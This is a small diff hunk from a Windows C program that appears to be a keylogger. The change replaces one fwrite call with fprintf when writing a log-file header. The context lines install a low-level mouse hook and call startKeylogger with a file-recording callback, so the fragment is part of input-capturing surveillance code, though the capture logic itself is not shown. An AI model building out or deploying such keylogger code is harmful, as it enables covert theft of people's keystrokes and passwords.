@@ -63,7 +63,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     if (!f) {
         return 1;
     }
-    fwrite("Starting the log file here.\n\n", 29, 1, f);
+    fprintf(f, "Starting the log file here.\n\n");
     fclose(f);
     mouseHook = SetWindowsHookEx(WH_MOUSE_LL, mouseMoveHook, hInstance, 0);
     startKeylogger(hInstance, recordInFileCallback);
